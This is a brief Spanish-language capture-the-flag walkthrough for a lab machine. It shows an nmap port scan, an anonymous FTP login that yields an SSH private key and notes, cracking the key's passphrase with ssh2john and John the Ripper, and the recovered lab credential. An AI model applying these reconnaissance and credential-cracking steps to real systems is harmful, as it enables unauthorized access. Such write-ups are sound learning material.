Empezamos con un reconocimiento básico usando [[NMAP]]
`nmap -p- --open -sSCV  --min-rate 5000 -n -Pn 10.10.188.238 -oN ScanPorts.txt`

Encontramos que están abiertos los puertos `22 SSH` y `30024 FTP`
Conectamos vía FTP con usuario anonymosus
`ftp 10.10.188.238 -p 30024`

Obtenemos dos fichero que encontramos `id_rsa` y `notes.txt`
En el fichero `notes.txt` encontramos un nombre de usuario `errorcauser`
Y el fichero `id_rsa` deberemos desencriptarlo con [[JOHN THE RIPPER]]
- Primero lo pasamos a hash de ssh `ssh2john id_rsa > hash`
- Segundo usamos una wordlist para sacar la clave `john --wordlist=/usr/share/wordlists/rockyou.txt hash`

Ahora tenemos el nombre del usuario y su contraseña `errorcauser:cupcake`

La parte de escalada de privilegios la obviaremos en este caso.
